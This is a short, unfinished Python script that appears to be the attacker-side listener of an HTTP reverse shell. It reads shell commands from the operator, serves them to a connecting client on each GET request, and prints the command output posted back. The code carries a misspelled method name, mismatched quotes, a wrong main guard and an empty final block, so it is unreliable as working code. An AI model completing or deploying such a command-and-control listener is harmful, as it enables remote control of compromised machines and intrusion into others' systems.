import http.server

HOST_NAME = "192.168.0.152"
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("Shell >")
        self.send_responce(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())
        
    def do_POST(self):
        
        self.send_response(200)
        self.end_headers()
        length = int(self.headers["Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())
        
        
if __name__=="main":

        